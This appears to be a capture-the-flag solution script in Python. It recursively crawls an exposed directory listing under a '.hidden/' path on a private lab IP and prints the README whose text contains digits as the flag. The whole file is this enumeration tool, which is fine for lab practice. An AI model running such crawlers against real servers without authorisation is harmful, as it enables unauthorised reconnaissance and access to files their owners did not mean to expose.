import requests

# get all the directories
def get_paths(ip, path=""):
    fp = requests.get(ip+path).text
    fp = fp.split("\n")
    paths = []
    for i in fp:
        if len(i)>2 and i[0] == '<' and i[1] == 'a':
            paths.append(i[i.find('\"')+1:i.find('/')+1])
    if paths:
        paths.pop()
    return paths

def get_flag(ip, path=""):
    response = requests.get(ip+path+'README').text
    for c in response:
        if c.isdigit():
            print("\033[92mFound:\033[0m", end='')
            print(response)
            exit()
    sub_paths = get_paths(ip, path)
    for sub_path in sub_paths:
        print("\033[93mSearching path : \033[0m", end='')
        print(path+sub_path)
        get_flag(ip, path+sub_path)

ip = "http://10.12.176.69/.hidden/"
print("\033[91mStarting...\033[0m")
get_flag(ip)
